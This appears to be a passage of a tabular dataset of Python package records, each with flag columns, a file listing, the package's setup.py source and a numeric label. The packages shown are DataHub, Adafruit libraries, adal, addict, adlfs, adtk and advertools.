    *s3_base,
    ""black>=21.12b0"",
    ""coverage>=5.1"",
    ""flake8>=3.8.3"",
    ""flake8-tidy-imports>=4.3.0"",
    ""isort>=5.7.0"",
    ""mypy>=0.950"",
    # pydantic 1.8.2 is incompatible with mypy 0.910.
    # See https://github.com/samuelcolvin/pydantic/pull/3175#issuecomment-995382910.
    ""pydantic>=1.9.0"",
    ""pytest>=6.2.2"",
    ""pytest-asyncio>=0.16.0"",
    ""pytest-cov>=2.8.1"",
    ""pytest-docker>=0.10.3,<0.12"",
    ""deepdiff"",
    ""requests-mock"",
    ""freezegun"",
    ""jsonpickle"",
    ""build"",
    ""twine"",
    *list(
        dependency
        for plugin in [
            ""bigquery"",
            ""bigquery-usage"",
            ""clickhouse"",
            ""clickhouse-usage"",
            ""delta-lake"",
            ""druid"",
            ""elasticsearch"",
            ""iceberg"",
            ""ldap"",
            ""looker"",
            ""lookml"",
            ""glue"",
            ""mariadb"",
            ""okta"",
            ""oracle"",
            ""postgres"",
            ""sagemaker"",
            ""kafka"",
            ""datahub-rest"",
            ""redash"",
            ""redshift"",
            ""redshift-usage"",
            ""data-lake"",
            ""s3"",
            ""tableau"",
            ""trino"",
            ""hive"",
            ""starburst-trino-usage"",
            ""powerbi"",
            ""vertica"",
            ""salesforce""
            # airflow is added below
        ]
        for dependency in plugins[plugin]
    ),
}

base_dev_requirements_airflow_1 = base_dev_requirements.copy()

base_dev_requirements = base_dev_requirements.union(
    # The feast plugin is not compatible with Airflow 1, so we add it later.
    {
        dependency
        for plugin in [
            ""feast"",
        ]
        for dependency in plugins[plugin]
    }
)


dev_requirements = {
    *base_dev_requirements,
    ""apache-airflow[snowflake]>=2.0.2"",  # snowflake is used in example dags
    ""snowflake-sqlalchemy<=1.2.4"",  # make constraint consistent with extras
}
dev_requirements_airflow_1_base = {
    ""apache-airflow==1.10.15"",
    ""apache-airflow-backport-providers-snowflake"",
    ""snowflake-sqlalchemy<=1.2.4"",  # make constraint consistent with extras
    ""WTForms==2.3.3"",  # make constraint consistent with extras
}
dev_requirements_airflow_1 = {
    *base_dev_requirements_airflow_1,
    *dev_requirements_airflow_1_base,
}

full_test_dev_requirements = {
    *list(
        dependency
        for plugin in [
            ""athena"",
            ""circuit-breaker"",
            ""clickhouse"",
            ""delta-lake"",
            ""druid"",
            ""feast"",
            ""feast-legacy"",
            ""hana"",
            ""hive"",
            ""iceberg"",
            ""kafka-connect"",
            ""ldap"",
            ""mongodb"",
            ""mssql"",
            ""mysql"",
            ""mariadb"",
            ""snowflake"",
            ""redash"",
            ""vertica"",
        ]
        for dependency in plugins[plugin]
    ),
}

entry_points = {
    ""console_scripts"": [""datahub = datahub.entrypoints:main""],
    ""datahub.ingestion.source.plugins"": [
        ""csv-enricher = datahub.ingestion.source.csv_enricher:CSVEnricherSource"",
        ""file = datahub.ingestion.source.file:GenericFileSource"",
        ""sqlalchemy = datahub.ingestion.source.sql.sql_generic:SQLAlchemyGenericSource"",
        ""athena = datahub.ingestion.source.sql.athena:AthenaSource"",
        ""azure-ad = datahub.ingestion.source.identity.azure_ad:AzureADSource"",
        ""bigquery = datahub.ingestion.source.sql.bigquery:BigQuerySource"",
        ""bigquery-usage = datahub.ingestion.source.usage.bigquery_usage:BigQueryUsageSource"",
        ""clickhouse = datahub.ingestion.source.sql.clickhouse:ClickHouseSource"",
        ""clickhouse-usage = datahub.ingestion.source.usage.clickhouse_usage:ClickHouseUsageSource"",
        ""data-lake = datahub.ingestion.source.data_lake:DataLakeSource"",
        ""delta-lake = datahub.ingestion.source.delta_lake:DeltaLakeSource"",
        ""s3 = datahub.ingestion.source.s3:S3Source"",
        ""dbt = datahub.ingestion.source.dbt:DBTSource"",
        ""druid = datahub.ingestion.source.sql.druid:DruidSource"",
        ""elasticsearch = datahub.ingestion.source.elastic_search:ElasticsearchSource"",
        ""feast-legacy = datahub.ingestion.source.feast_legacy:FeastSource"",
        ""feast = datahub.ingestion.source.feast:FeastRepositorySource"",
        ""glue = datahub.ingestion.source.aws.glue:GlueSource"",
        ""sagemaker = datahub.ingestion.source.aws.sagemaker:SagemakerSource"",
        ""hana = datahub.ingestion.source.sql.hana:HanaSource"",
        ""hive = datahub.ingestion.source.sql.hive:HiveSource"",
        ""kafka = datahub.ingestion.source.kafka:KafkaSource"",
        ""kafka-connect = datahub.ingestion.source.kafka_connect:KafkaConnectSource"",
        ""ldap = datahub.ingestion.source.ldap:LDAPSource"",
        ""looker = datahub.ingestion.source.looker:LookerDashboardSource"",
        ""lookml = datahub.ingestion.source.lookml:LookMLSource"",
        ""datahub-lineage-file = datahub.ingestion.source.metadata.lineage:LineageFileSource"",
        ""datahub-business-glossary = datahub.ingestion.source.metadata.business_glossary:BusinessGlossaryFileSource"",
        ""mode = datahub.ingestion.source.mode:ModeSource"",
        ""mongodb = datahub.ingestion.source.mongodb:MongoDBSource"",
        ""mssql = datahub.ingestion.source.sql.mssql:SQLServerSource"",
        ""mysql = datahub.ingestion.source.sql.mysql:MySQLSource"",
        ""mariadb = datahub.ingestion.source.sql.mariadb.MariaDBSource"",
        ""okta = datahub.ingestion.source.identity.okta:OktaSource"",
        ""oracle = datahub.ingestion.source.sql.oracle:OracleSource"",
        ""postgres = datahub.ingestion.source.sql.postgres:PostgresSource"",
        ""redash = datahub.ingestion.source.redash:RedashSource"",
        ""redshift = datahub.ingestion.source.sql.redshift:RedshiftSource"",
        ""redshift-usage = datahub.ingestion.source.usage.redshift_usage:RedshiftUsageSource"",
        ""snowflake = datahub.ingestion.source.sql.snowflake:SnowflakeSource"",
        ""snowflake-usage = datahub.ingestion.source.usage.snowflake_usage:SnowflakeUsageSource"",
        ""superset = datahub.ingestion.source.superset:SupersetSource"",
        ""tableau = datahub.ingestion.source.tableau:TableauSource"",
        ""openapi = datahub.ingestion.source.openapi:OpenApiSource"",
        ""metabase = datahub.ingestion.source.metabase:MetabaseSource"",
        ""trino = datahub.ingestion.source.sql.trino:TrinoSource"",
        ""starburst-trino-usage = datahub.ingestion.source.usage.starburst_trino_usage:TrinoUsageSource"",
        ""nifi = datahub.ingestion.source.nifi:NifiSource"",
        ""powerbi = datahub.ingestion.source.powerbi:PowerBiDashboardSource"",
        ""iceberg = datahub.ingestion.source.iceberg.iceberg:IcebergSource"",
        ""vertica = datahub.ingestion.source.sql.vertica:VerticaSource"",
        ""presto-on-hive = datahub.ingestion.source.sql.presto_on_hive:PrestoOnHiveSource"",
        ""pulsar = datahub.ingestion.source.pulsar:PulsarSource"",
        ""salesforce = datahub.ingestion.source.salesforce:SalesforceSource"",
    ],
    ""datahub.ingestion.sink.plugins"": [
        ""file = datahub.ingestion.sink.file:FileSink"",
        ""console = datahub.ingestion.sink.console:ConsoleSink"",
        ""datahub-kafka = datahub.ingestion.sink.datahub_kafka:DatahubKafkaSink"",
        ""datahub-rest = datahub.ingestion.sink.datahub_rest:DatahubRestSink"",
    ],
    ""datahub.ingestion.checkpointing_provider.plugins"": [
        ""datahub = datahub.ingestion.source.state_provider.datahub_ingestion_checkpointing_provider:DatahubIngestionCheckpointingProvider"",
    ],
    ""datahub.ingestion.reporting_provider.plugins"": [
        ""datahub = datahub.ingestion.reporting.datahub_ingestion_reporting_provider:DatahubIngestionReportingProvider"",
    ],
    ""apache_airflow_provider"": [""provider_info=datahub_provider:get_provider_info""],
}


setuptools.setup(
    # Package metadata.
    name=package_metadata[""__package_name__""],
    version=package_metadata[""__version__""],
    url=""https://datahubproject.io/"",
    project_urls={
        ""Documentation"": ""https://datahubproject.io/docs/"",
        ""Source"": ""https://github.com/datahub-project/datahub"",
        ""Changelog"": ""https://github.com/datahub-project/datahub/releases"",
    },
    license=""Apache License 2.0"",
    description=""A CLI to work with DataHub metadata"",
    long_description=get_long_description(),
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: System Administrators"",
        ""License :: OSI Approved"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Operating System :: Unix"",
        ""Operating System :: POSIX :: Linux"",
        ""Environment :: Console"",
        ""Environment :: MacOS X"",
        ""Topic :: Software Development"",
    ],
    # Package info.
    zip_safe=False,
    python_requires="">=3.7"",
    package_dir={"""": ""src""},
    packages=setuptools.find_namespace_packages(where=""./src""),
    package_data={
        ""datahub"": [""py.typed""],
        ""datahub.metadata"": [""schema.avsc""],
        ""datahub.metadata.schemas"": [""*.avsc""],
        ""datahub.ingestion.source.feast_image"": [""Dockerfile"", ""requirements.txt""],
    },
    entry_points=entry_points,
    # Dependencies.
    install_requires=list(base_requirements | framework_common),
    extras_require={
        ""base"": list(framework_common),
        **{
            plugin: list(framework_common | dependencies)
            for (plugin, dependencies) in plugins.items()
        },
        ""all"": list(
            framework_common.union(
                *[
                    requirements
                    for plugin, requirements in plugins.items()
                    if plugin not in all_exclude_plugins
                ]
            )
        ),
        ""dev"": list(dev_requirements),
        ""dev-airflow1-base"": list(dev_requirements_airflow_1_base),
        ""dev-airflow1"": list(dev_requirements_airflow_1),
        ""integration-tests"": list(full_test_dev_requirements),
    },
)
",0
Adafruit-Blinka-8.2.0,0,1,1,1,1,0,1,0,build.yml release.yml .gitignore .gitmodules .pre-commit-config.yaml .pylintrc .readthedocs.yaml CODE_OF_CONDUCT.md api.rst api.rst.license conf.py examples.rst examples.rst.license index.rst index.rst.license requirements.txt favicon.ico favicon.ico.license analog_in.py bbb_digitalio.py mcps_busio_i2c.py pb_digitalio.py piblinka.py pi_busio_i2c.py pi_busio_spi.py pi_digitalio.py LICENSE CC-BY-4.0.txt MIT.txt Unlicense.txt PKG-INFO README.rst README.rst.license requirements.txt requirements.txt.license setup.cfg setup.py time.py __init__.py bpim2zero.py bpim5.py __init__.py beaglebone_ai.py beaglebone_black.py beaglebone_pocketbeagle.py beaglev_starlight.py __init__.py binho_nova.py clockworkcpi3.py coral_dev_board.py coral_dev_board_mini.py dragonboard_410c.py feather_huzzah.py feather_u2if.py ftdi_ft2232h.py ftdi_ft232h.py giantboard.py greatfet_one.py odroidc2.py odroidc4.py odroidn2.py odroidxu4.py __init__.py hifive_unleashed.py itsybitsy_u2if.py khadasvim3.py __init__.py lubancat_imx6ull.py lubancat_stm32mp157.py __init__.py macropad_u2if.py microchip_mcp2221.py duo2.py neo.py neoair.py __init__.py nodemcu.py clara_agx_xavier.py jetson_nano.py jetson_nx.py jetson_orin.py jetson_tx1.py jetson_tx2.py jetson_tx2_nx.py jetson_xavier.py __init__.py omega2.py __init__.py orangepi3.py orangepipc.py orangepir1.py orangepizero.py orangepizero2.py orangepizeroplus.py orangepizeroplus2h5.py __init__.py pico_u2if.py pine64.py pineH64.py pyboard.py qt2040_trinkey_u2if.py qtpy_u2if.py radxazero.py rockpi4.py rockpie.py rockpis.py __init__.py pico.py raspi_1b_rev1.py raspi_1b_rev2.py raspi_40pin.py raspi_4b.py raspi_cm.py __init__.py soPine.py osd32mp1_brk.py osd32mp1_red.py stm32mp157c_dk2.py __init__.py tritium-h3.py udoo_x86ultra.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py __init__.py pin.py sysfs_pwmout.py __init__.py pin.py libgpiod_pulsein libgpiod_pulsein.lic libgpiod_pulsein64 libgpiod_pulsein64.l PulseIn.py __init__.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py __init__.py pin.py __init__.py __init__.py pin.py __init__.py neopixel.py pin.py libgpiod_pulsein libgpiod_pulsein.license libgpiod_pulsein64 libgpiod_pulsein64.license PulseIn.py __init__.py PWMOut.py __init__.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py i2c.py pin.py spi.py url.py __init__.py __init__.py i2c.py libgpiod_pin.py periphery_pin.py spi.py sysfs_analogin.py sysfs_analogout.py sysfs_pin.py sysfs_pwmout.py __init__.py i2c.py spi.py __init__.py pin.py __init__.py analogio.py i2c.py mcp2221.py pin.py __init__.py pin.py __init__.py pin.py __init__.py i2c.py pin.py pwmout.py spi.py uart.py __init__.py pin.py __init__.py pin.py __init__.py analogio.py i2c.py pin.py pwmout.py spi.py uart.py __init__.py pin.py __init__.py __init__.py PWMOut.py pin.py __init__.py pin.py __init__.py pin.py __init__.py __init__.py i2c.py pin.py spi.py uart.py __init__.py analogio.py i2c.py neopixel.py pin.py pwmio.py rp2040_u2if.py spi.py __init__.py pin.py __init__.py pin.py __init__.py __init__.py pin.py __init__.py __init__.py pin.py __init__.py __init__.py pin.py __init__.py pin.py __init__.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py pin.py __init__.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt analogio.py bitbangio.py board.py busio.py digitalio.py keypad.py pin.py __init__.py micropython.py neopixel_write.py onewireio.py pulseio.py pwmio.py rainbowio.py usb_hid.py __version__.py upload_feather_huzzah_circuitpython_put.sh upload_feather_huzzah_micropython_put.sh upload_pyboard_micropython_cp.sh adafruit_blinka.py i2c.py __init__.py __init__.py digitalio.py i2c.py microcontroller.py uart.py __init__.py __init__.py unittest.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

# SPDX-FileCopyrightText: 2021 Melissa LeBlanc-Williams for Adafruit Industries
#
# SPDX-License-Identifier: MIT

# Note: To use the 'upload' functionality of this file, you must:
#   $ pip install twine

import io
import os
import sys

from setuptools import setup, find_packages

here = os.path.abspath(os.path.dirname(__file__))

# Import the README and use it as the long-description.
# Note: this will only work if 'README.md' is present in your MANIFEST.in file!
with io.open(os.path.join(here, ""README.rst""), encoding=""utf-8"") as f:
    long_description = ""\n"" + f.read()

board_reqs = []
if os.path.exists(""/proc/device-tree/compatible""):
    with open(""/proc/device-tree/compatible"", ""rb"") as f:
        compat = f.read()
    if b""nvidia,tegra"" in compat:
        board_reqs = [""Jetson.GPIO""]
    if (
        b""brcm,bcm2835"" in compat
        or b""brcm,bcm2836"" in compat
        or b""brcm,bcm2837"" in compat
        or b""brcm,bcm2838"" in compat
        or b""brcm,bcm2711"" in compat
    ):
        board_reqs = [""RPi.GPIO"", ""rpi_ws281x>=4.0.0"", ""sysv_ipc>=1.1.0""]

setup(
    name=""Adafruit-Blinka"",
    use_scm_version={
        # This is needed for the PyPI version munging in the Github Actions release.yml
        ""git_describe_command"": ""git describe --tags --long"",
        ""local_scheme"": ""no-local-version"",
    },
    setup_requires=[""setuptools_scm""],
    description=""CircuitPython APIs for non-CircuitPython versions of Python such as CPython on Linux and MicroPython."",
    long_description=long_description,
    long_description_content_type=""text/x-rst"",
    author=""Adafruit Industries"",
    author_email=""circuitpython@adafruit.com"",
    python_requires="">=3.7.0"",
    url=""https://github.com/adafruit/Adafruit_Blinka"",
    package_dir={"""": ""src""},
    packages=find_packages(""src""),
    # py_modules lists top-level single file packages to include.
    # find_packages only finds packages in directories with __init__.py files.
    py_modules=[
        ""analogio"",
        ""bitbangio"",
        ""board"",
        ""busio"",
        ""digitalio"",
        ""keypad"",
        ""micropython"",
        ""neopixel_write"",
        ""onewireio"",
        ""pulseio"",
        ""pwmio"",
        ""rainbowio"",
        ""usb_hid"",
    ],
    package_data={
        ""adafruit_blinka.microcontroller.bcm283x.pulseio"": [
            ""libgpiod_pulsein"",
            ""libgpiod_pulsein64"",
        ]
    },
    install_requires=[
        ""Adafruit-PlatformDetect>=3.13.0"",
        ""Adafruit-PureIO>=1.1.7"",
        ""pyftdi>=0.40.0"",
        ""adafruit-circuitpython-typing"",
    ]
    + board_reqs,
    license=""MIT"",
    classifiers=[
        # Trove classifiers
        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: Implementation :: MicroPython"",
    ],
)
",1
adafruit-circuitpython-busdevice-5.2.1,0,1,1,1,0,0,1,0,adafruit_circuitpython_pr.md build.yml failure-help-text.yml release.yml .gitignore .pre-commit-config.yaml .pylintrc .readthedocs.yaml i2c_device.py spi_device.py __init__.py dependency_links.tx PKG-INFO requires.txt SOURCES.txt top_level.txt CODE_OF_CONDUCT.md api.rst api.rst.license conf.py examples.rst examples.rst.license index.rst index.rst.license requirements.txt favicon.ico favicon.ico.license busdevice_read_register_i2c_simpletest.py busdevice_read_register_spi_simpletest.py LICENSE CC-BY-4.0.txt MIT.txt Unlicense.txt optional_requirements.txt PKG-INFO pyproject.toml README.rst README.rst.license requirements.txt setup.cfg,,1
adafruit-circuitpython-typing-1.7.3,0,1,1,1,0,0,1,0,adafruit_circuitpython_pr.md build.yml failure-help-text.yml release.yml .gitignore .pre-commit-config.yaml .pylintrc .readthedocs.yaml dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt device_drivers.py io.py led.py pil.py pwmio.py py.typed socket.py __init__.py CODE_OF_CONDUCT.md api.rst api.rst.license conf.py examples.rst examples.rst.license index.rst index.rst.license requirements.txt favicon.ico favicon.ico.license typing_simpletest.py LICENSE CC-BY-4.0.txt MIT.txt Unlicense.txt optional_requirements.txt PKG-INFO pyproject.toml README.rst README.rst.license requirements.txt setup.cfg,,1
Adafruit-PlatformDetect-3.27.0,0,1,1,1,1,0,1,0,build.yml release.yml .gitignore .pre-commit-config.yaml .pylintrc .readthedocs.yaml board.py chip.py boards.py chips.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt detect.py CODE_OF_CONDUCT.md api.rst api.rst.license beaglebone_eeprom.txt conf.py index.rst index.rst.license requirements.txt favicon.ico favicon.ico.license LICENSE CC-BY-4.0.txt MIT.txt Unlicense.txt PKG-INFO README.rst README.rst.license requirements.txt setup.cfg setup.py,"# SPDX-FileCopyrightText: 2021 ladyada for Adafruit Industries
#
# SPDX-License-Identifier: MIT

""""""A setuptools based setup module.

See:
https://packaging.python.org/en/latest/distributing.html
https://github.com/pypa/sampleproject
""""""

from setuptools import setup, find_packages

# To use a consistent encoding
from codecs import open
from os import path

here = path.abspath(path.dirname(__file__))

# Get the long description from the README file
with open(path.join(here, ""README.rst""), encoding=""utf-8"") as f:
    long_description = f.read()

setup(
    name=""Adafruit-PlatformDetect"",
    use_scm_version=True,
    setup_requires=[""setuptools_scm""],
    description=""Platform detection for use by libraries like Adafruit-Blinka."",
    long_description=long_description,
    long_description_content_type=""text/x-rst"",
    python_requires="">=3.7.0"",
    url=""https://github.com/adafruit/Adafruit_Python_PlatformDetect"",
    # If your package is a single module, use this instead of 'packages':
    author=""Adafruit Industries"",
    author_email=""circuitpython@adafruit.com"",
    install_requires=[],
    # Choose your license
    license=""MIT"",
    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""Topic :: Software Development :: Libraries"",
        ""Topic :: System :: Hardware"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
    ],
    packages=[""adafruit_platformdetect"", ""adafruit_platformdetect.constants""],
)
",1
Adafruit_PureIO-1.1.9,0,1,1,1,1,0,1,0,ISSUE_TEMPLATE.md PULL_REQUEST_TEMPLATE.md build.yml release.yml .gitignore .pylintrc smbus.py spi.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CODE_OF_CONDUCT.md api.rst conf.py index.rst favicon.ico LICENSE PKG-INFO README.rst requirements.txt setup.cfg setup.py test_I2C.py,"""""""A setuptools based setup module.

See:
https://packaging.python.org/en/latest/distributing.html
https://github.com/pypa/sampleproject
""""""

from setuptools import setup

# To use a consistent encoding
from codecs import open
from os import path

here = path.abspath(path.dirname(__file__))

# Import the README and use it as the long-description.
# Note: this will only work if 'README.md' is present in your MANIFEST.in file!
with open(path.join(here, ""README.rst""), encoding=""utf-8"") as f:
    long_description = ""\n"" + f.read()

setup(
    name=""Adafruit_PureIO"",
    use_scm_version=True,
    setup_requires=[""setuptools_scm""],
    description=""Pure python (i.e. no native extensions) access to Linux IO    including I2C and SPI. Drop in replacement for smbus and spidev modules."",
    long_description=long_description,
    long_description_content_type=""text/x-rst"",
    # The project's main homepage.
    url=""https://github.com/adafruit/Adafruit_Python_PureIO"",
    # Author details
    author=""Adafruit Industries"",
    author_email=""circuitpython@adafruit.com"",
    python_requires="">=3.5.0"",
    # If your package is a single module, use this instead of 'packages':
    install_requires=[],
    license=""MIT"",
    # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        ""Development Status :: 3 - Alpha"",
        ""Intended Audience :: Developers"",
        ""Topic :: Software Development :: Libraries"",
        ""Topic :: System :: Hardware"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: Implementation :: CPython"",
    ],
    keywords=""adafruit blinka micropython pureio ioctl spi i2c python"",
    packages=[""Adafruit_PureIO""],
)
",1
adal-1.2.7,0,1,1,1,1,0,0,0,adal_error.py argument.py authentication_context.py authentication_parameters.py authority.py cache_driver.py code_request.py constants.py log.py mex.py oauth2_client.py self_signed_jwt.py token_cache.py token_request.py user_realm.py util.py wstrust_request.py wstrust_response.py xmlutil.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"﻿#!/usr/bin/env python
#------------------------------------------------------------------------------
#
# Copyright (c) Microsoft Corporation.
# All rights reserved.
#
# This code is licensed under the MIT License.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files(the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and / or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions :
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
#------------------------------------------------------------------------------

from setuptools import setup
import re, io

# setup.py shall not import adal
__version__ = re.search(
    r'__version__\s*=\s*[\'""]([^\'""]*)[\'""]',  # It excludes inline comment too
    io.open('adal/__init__.py', encoding='utf_8_sig').read()
    ).group(1)

# To build:
# python setup.py sdist
# python setup.py bdist_wheel
#
# To install:
# python setup.py install
#
# To register (only needed once):
# python setup.py register
#
# To upload:
# python setup.py sdist upload
# python setup.py bdist_wheel upload

setup(
    name='adal',
    version=__version__,
    description=('Note: This library is already replaced by MSAL Python, ' +
                 'available here: https://pypi.org/project/msal/ .' +
                 'ADAL Python remains available here as a legacy. ' +
                 'The ADAL for Python library makes it easy for python ' +
                 'application to authenticate to Azure Active Directory ' +
                 '(AAD) in order to access AAD protected web resources.'),
    license='MIT',
    author='Microsoft Corporation',
    author_email='nugetaad@microsoft.com',
    url='https://github.com/AzureAD/azure-activedirectory-library-for-python',
    classifiers=[
        'Development Status :: 6 - Mature',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'License :: OSI Approved :: MIT License',
    ],
    packages=['adal'],
    install_requires=[
        'PyJWT>=1.0.0,<3',
        'requests>=2.0.0,<3',
        'python-dateutil>=2.1.0,<3',
        'cryptography>=1.1.0'
    ]
)
",0
addict-2.4.0,0,1,1,1,1,0,1,0,addict.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py test_addict.py,"from setuptools import setup
import addict

SHORT='Addict is a dictionary whose items can be set using both attribute and item syntax.'
LONG=('Addict is a module that exposes a dictionary subclass that allows items to be set like attributes. '
     'Values are gettable and settable using both attribute and item syntax. '
     'For more info check out the README at \'github.com/mewwts/addict\'.')

setup(
    name='addict',
    version=addict.__version__,
    packages=['addict'],
    url='https://github.com/mewwts/addict',
    author=addict.__author__,
    author_email='mats@plysjbyen.net',
    classifiers=[
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
    description=SHORT,
    long_description=LONG,
    test_suite='test_addict',
    package_data={'': ['LICENSE']}
)
",1
adlfs-2022.7.0,0,1,1,1,0,0,0,0,spec.py utils.py _version.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py versioneer.py,"#!/usr/bin/env python

from os.path import exists

from setuptools import setup

import versioneer

setup(
    name=""adlfs"",
    version=versioneer.get_version(),
    cmdclass=versioneer.get_cmdclass(),
    description=""Access Azure Datalake Gen1 with fsspec and dask"",
    url=""https://github.com/dask/adlfs/"",
    classifiers=[
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: BSD License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
    ],
    maintainer=""Greg Hayes"",
    maintainer_email=""hayesgb@gmail.com"",
    license=""BSD"",
    keywords=[""file-system"", ""dask"", ""azure""],
    packages=[""adlfs""],
    python_requires="">3.8"",
    long_description_content_type=""text/markdown"",
    long_description=open(""README.md"").read() if exists(""README.md"") else """",
    install_requires=[
        ""aiohttp"",
        ""azure-core>=1.7.0"",
        ""azure-datalake-store>=0.0.46,<0.1"",
        ""azure-identity"",
        ""azure-storage-blob>=12.5.0"",
        ""fsspec>=2021.10.1"",
    ],
    extras_require={
        ""docs"": [""sphinx"", ""myst-parser"", ""furo"", ""numpydoc""],
    },
    tests_require=[""pytest"", ""docker""],
    zip_safe=False,
    entry_points={
        ""fsspec.specs"": [
            ""abfss=adlfs.AzureBlobFileSystem"",
        ],
    },
)
",1
adtk-0.6.2,0,1,1,1,1,0,0,0,LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py _aggregator.py __init__.py _data.py __init__.py _detector_1d.py _detector_hd.py __init__.py _metrics.py __init__.py _pipe.py __init__.py _transformer_1d.py _transformer_hd.py __init__.py _visualization.py __init__.py _aggregator_base.py _base.py _detector_base.py _transformer_base.py _utils.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt,"from setuptools import setup

setup()
",1
advertools-0.13.1,0,1,1,1,1,0,0,0,ad_create.py ad_from_string.py cli.py emoji.py extract.py header_spider.py knowledge_graph.py kw_generate.py logs.py regex.py reverse_dns_lookup.py robotstxt.py serp.py sitemaps.py spider.py stopwords.py twitter.py urlytics.py url_builders.py word_frequency.py word_tokenize.py youtube.py _yt_helpers.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt all.py any.py base.py count.py deciles.py first.py has_nulls.py iqr.py mad.py max.py max_length.py max_precision.py mean.py median.py min.py mode.py percentiles.py quartiles.py quintiles.py stdev.py sum.py summary.py variance.py __init__.py columns.py base.py change.py formula.py percent.py percentile_rank.py percent_change.py rank.py slug.py __init__.py config.py csv_py2.py csv_py3.py base.py boolean.py date.py date_time.py number.py text.py time_delta.py __init__.py exceptions.py fixed.py mapped_sequence.py rows.py aggregate.py bar_chart.py bins.py column_chart.py compute.py denormalize.py distinct.py exclude.py find.py from_csv.py from_fixed.py from_json.py from_object.py group_by.py homogenize.py join.py limit.py line_chart.py merge.py normalize.py order_by.py pivot.py print_bars.py print_html.py print_structure.py print_table.py rename.py scatterplot.py select.py to_csv.py to_json.py where.py __init__.py aggregate.py bar_chart.py column_chart.py from_csv.py from_json.py having.py line_chart.py merge.py print_structure.py proxy_methods.py scatterplot.py to_csv.py to_json.py __init__.py testcase.py type_tester.py utils.py warns.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS.rst test_joins.py __init__.py CHANGELOG.rst charts.py COPYING about.rst aggregations.rst columns_and_rows.rst computations.rst config.rst csv.rst data_types.rst exceptions.rst fixed.rst misc.rst table.rst tableset.rst testcase.rst type_tester.rst warns.rst api.rst changelog.rst conf.py contributing.rst charting.rst columns.rst compute.rst create.rst datetime.rst excel.rst filter.rst homogenize.rst locale.rst lookup.rst r.rst rank.rst remove.rst save.rst search.rst sort.rst sql.rst standardize.rst statistics.rst transform.rst underscore.rst cookbook.rst 